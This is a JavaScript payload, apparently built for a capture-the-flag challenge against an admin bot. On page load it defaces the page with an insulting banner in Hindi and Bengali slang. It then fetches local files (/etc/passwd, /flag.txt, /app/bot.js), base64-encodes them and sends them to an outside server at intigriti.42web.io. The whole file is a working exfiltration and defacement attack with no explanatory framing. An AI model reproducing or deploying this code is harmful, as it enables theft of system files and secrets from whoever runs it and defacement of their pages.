(function () {
    function run() {
        document.body.replaceChildren();


        document.body.style.cssText = `
            margin: 0;
            height: 100vh;
            background: #111;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            font-family: system-ui, sans-serif;
        `;

        const topText = document.createElement("div");
        topText.innerText = "CHUTIYA SALA!\nBAAP KO KHODNA, OR MUJHE CHODNA MAT SIKHA!";
        topText.style.cssText = `
            margin-top: 40px;
            font-size: 32px;
            color: #00e5ff;
            text-align: center;
            white-space: pre-line;
        `;

        const image = document.createElement("img");
        image.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSOPmXKmtdnJoAEiPUq5_UPxJbuRcatI2GCWQ&s";
        image.style.cssText = "width:300px;max-width:80%;";

        const footerText = document.createElement("div");
        footerText.innerText =
            "[Info : Ami jani ami AHONKARI noi but, Eisob jaygai amar OVIMAN ektu Besi beriye ase, I know i am not the best, but I am trying to do my best! !]";
        footerText.style.cssText = `
            margin-bottom: 30px;
            font-size: 16px;
            color: #aaa;
            text-align: center;
        `;

        document.body.append(topText, image, footerText);
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", run);
    } else {
        run();
    }
  // Read /etc/passwd (Linux)
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(data => {
    fetch('https://intigriti.42web.io/base.php?data=' + btoa(data));
  });

// Read flag.txt (common CTF location)
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(data => {
    fetch('https://intigriti.42web.io/base.php?flag=' + btoa(data));
  });

// Read app files
fetch('file:///app/bot.js')
  .then(r => r.text())
  .then(data => {
    fetch('https://intigriti.42web.io/base.php?bot=' + btoa(data));
  });





})();
